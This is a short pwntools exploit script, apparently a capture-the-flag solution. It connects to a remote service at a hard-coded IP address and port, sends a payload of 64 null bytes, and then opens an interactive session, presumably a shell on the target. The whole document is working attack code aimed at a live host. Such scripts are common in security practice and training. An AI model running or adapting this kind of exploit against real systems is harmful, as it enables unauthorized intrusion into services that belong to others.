from pwn import *

io = remote('34.146.101.4', 30007)

payload = '\0'*64

print(io.recv())
io.sendline(payload)
io.interactive()
